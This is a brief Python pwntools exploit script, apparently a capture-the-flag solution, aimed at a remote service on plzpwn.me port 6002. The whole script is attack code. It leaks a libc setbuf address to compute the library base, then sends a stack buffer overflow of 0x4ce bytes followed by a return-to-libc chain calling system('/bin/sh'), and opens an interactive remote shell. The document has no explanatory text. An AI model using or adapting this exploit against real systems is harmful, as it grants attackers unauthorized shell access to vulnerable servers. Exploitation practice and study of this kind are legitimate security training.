from pwn import *

libc = ELF('./libc-2.23.so')

p = remote("plzpwn.me", 6002)

p.recv(2)
leak = int(p.recv(10), 16)
p.recv()

libc.address = leak - libc.symbols['setbuf']
system = libc.symbols['system']
binsh = libc.search("/bin/sh").next()

p.sendline('A'*(0x4ce) + 
        p32(system) +
        p32(0) +
        p32(binsh)
        )
p.interactive()
